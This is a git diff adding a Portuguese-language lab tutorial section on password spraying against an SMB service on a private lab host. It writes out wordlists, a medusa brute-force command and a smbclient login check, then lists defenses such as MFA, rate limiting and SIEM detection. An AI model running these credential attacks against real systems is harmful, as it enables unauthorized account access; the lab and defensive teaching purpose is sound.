@@ -110,3 +110,41 @@ Utilizando o seguinte comando podemos listar os usuários encontrados:
 <img width="350" height="584" alt="image" src="https://github.com/user-attachments/assets/3c2ef8cd-ea0e-4199-acce-416a13865e71" />
 
 
+Para darmos prosseguimento ao ataque, devemos criar uma wordlist para usuários e senhas.
+
+    echo -e "user\nmsfadmin\nservice" > smb_users.txt
+
+    echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+E para realizarmos de fato o ataque, utlizaremos o seguinte comando do medusa:
+
+    medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+1. "-U smb_users.txt": lista de usuários encontrados;
+2. "-P senhas_spray.txt": lista de senhas fracas;
+3. "-M smbnt": módulo/serviço a ser atacado (aqui indica o módulo SMB/NTLM);
+
+<img width="1127" height="230" alt="image" src="https://github.com/user-attachments/assets/f14f9722-c967-4110-9cab-ff283fc162ac" />
+
+Após o fim da execução, é possível notar que o comando nos retornou, com sucesso, o usuário e senha com acesso real ao sistema. Para confirmar se o ataque foi um sucesso, iremos acessar o serviço smb, utilzando o comando:
+
+    smbclient -L //192.168.56.101 -U msfadmin
+
+Após digitarmos o usuário e senha encontrados anteriormente, podemos confirmar que o ataque foi bem sucedido.
+<img width="657" height="270" alt="image" src="https://github.com/user-attachments/assets/34d1adef-df79-4cbe-a5fc-966f8de9516a" />
+
+# Como se defender desse tipo de ataque?
+
+Password spraying é um ataque silencioso e eficiente porque testa poucas senhas comuns contra muitos usuários, evitando gatilhos de bloqueio imediato. Segue abaixo algumas formas de se defender do ataque:
+
+1. MFA obrigatória para contas sensíveis.
+
+2. Rate limiting por IP e por usuário.
+
+3. Detecção de padrões (credential stuffing / password spraying) no SIEM.
+
+4. Verificação de senhas comprometidas (HaveIBeenPwned).
+
+5. Backoff progressivo + desafios adaptativos (CAPTCHA)
+
+    
